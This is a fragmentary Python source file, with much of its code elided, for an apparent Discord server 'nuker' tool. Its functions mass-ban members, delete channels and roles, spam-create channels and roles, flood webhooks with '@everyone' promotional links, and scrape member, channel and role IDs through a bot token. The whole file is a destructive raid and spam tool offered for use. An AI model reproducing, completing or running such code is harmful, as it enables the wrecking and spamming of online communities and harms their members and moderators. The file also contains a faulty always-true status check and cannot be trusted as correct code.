...
class rex:
    ...
    def KickMembers(self, guild, member):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN} {Fore.GREEN}Successfully Banned {Fore.GREEN}{member.strip()}")
                    break
                else:
                    break
    ...
    def DeleteChannels(self, guild, channel):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN} {Fore.GREEN}Deleted Channel {Fore.GREEN}{channel.strip()}")
                    break
                else:
                    break
    ...
    def DeleteRoles(self, guild, role):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN} {Fore.GREEN}Role Deleted {Fore.GREEN}{role.strip()}")
                    break
                else:
                    break
    ...
    def SpamChannels(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN} {Fore.GREEN}Created Channel {Fore.GREEN}{name}")
                    break
                else:
                    break
    ...
    def SpamRoles(self, guild, name):
        while True:
            ...
            if 'retry_after' in r.text:
                ...
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.GREEN} {Fore.GREEN}Created Role {Fore.GREEN} {name}")
                    break
                else:
                    break

    def WebhookSend(self, webhook, message): #credits to aztec
        while True:
            json = {
                'content': message if message != '' else "@everyone https://dsc.gg/guapcave GUAP CAVE ON TOP",
                'tts': False,
                'username': 'Youtube LuvAztec'
            }
            ...
            if r.status_code == 429:
                ...
                if r.status_code == 204 or 201 or 200:
                    print(f"{Fore.GREEN} {Fore.RED}Sent message {Fore.GREEN} {message}")
                    break
                else:
                    break
    ...
    async def SpamWebhook(self, guild_id, amount, message):
        ...
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='slackn', reason="yt - luvaztec")
                print(f"{Fore.GREEN} {Fore.RED}Spammed")
    ...
    async def Scrape(self):
        guild = input(f'{Fore.YELLOW} {Fore.RED}Server Id: {Fore.GREEN}')
        ...
        with open('Guap/members.txt', 'a') as m:
            for member in members:
                ...
                membercount += 1
            print(f"\n{Fore.GREEN} {Fore.GREEN}Server has {Fore.GREEN}{membercount} Members")
            m.close()
        ...
        with open('Guap/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                ...
                channelcount += 1
            print(f"{Fore.GREEN} {Fore.GREEN}Scrapped {Fore.GREEN}{channelcount} Channels")
            c.close()
        ...
        with open('Guap/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.YELLOW} {Fore.GREEN}Scrapped {Fore.GREEN}{rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{Fore.GREEN} {Fore.GREEN}Server Id: {Fore.GREEN}')
        channel_name = input(f"{Fore.GREEN} {Fore.GREEN}Channels Name: {Fore.GREEN}")
        channel_amount = input(f"{Fore.GREEN} {Fore.GREEN}How Many?: {Fore.GREEN}")
        role_name = input(f"{Fore.GREEN} {Fore.GREEN}Roles Name: {Fore.GREEN}")
        role_amount = input(f"{Fore.GREEN} {Fore.GREEN}How Many?: {Fore.GREEN}")
        print()
    ...
    async def BanExecute(self):
        guild = input(f'{Fore.GREEN} {Fore.RED}Server Id: {Fore.GREEN}')
        print()
        members = open('Guap/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
    ...
    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.GREEN} {Fore.GREEN}Server Id: {Fore.GREEN}')
        name = input(f"{Fore.GREEN} {Fore.GREEN}Channel Name:: {Fore.GREEN}")
        amount = input(f"{Fore.GREEN} {Fore.GREEN}How Many?: {Fore.GREEN}")
        print()
    ...
    async def RoleSpamExecute(self):
        guild = input(f'{Fore.GREEN} {Fore.RED}Server Id: {Fore.GREEN}')
        name = input(f"{Fore.GREEN} {Fore.RED}Role Name: {Fore.GREEN}")
        amount = input(f"{Fore.GREEN} {Fore.RED}How Many?: {Fore.GREEN}")
        print()
        for i in range(int(amount)):
...
''')
        ...
        print(f'''
                   ...
                   {Fore.CYAN} ┌─┐┬  ┌─┐┌─┐┬┌─┬┌┐┌
                    ...
                    {Fore.CYAN}└─┘┴─┘┴ ┴└─┘┴ ┴┴┘└┘
                          ...
                          9 = Channel Spam
        ''')
        await client.change_presence(activity=discord.Game(name="LuvAztec on YouTube"))
        choice = input(f'{Fore.GREEN} {Fore.RED}Number: {Fore.GREEN}')
        if choice == '2': #bans
            ...
            amount = int(input(f"{Fore.YELLOW} {Fore.RED}How Many?: {Fore.GREEN}"))
            guild_id = int(input(f"{Fore.YELLOW}{Fore.RED}Server Id: {Fore.GREEN}"))
            message = str(input(f"{Fore.YELLOW} {Fore.RED}Webhook Message: {Fore.GREEN}"))
    ...
    def Startup(self):
        try:
            ...
            print(f'{Fore.YELLOW} {Fore.RED}Token Was Invalid {Fore.GREEN}')
            input()
            os._exit(0)
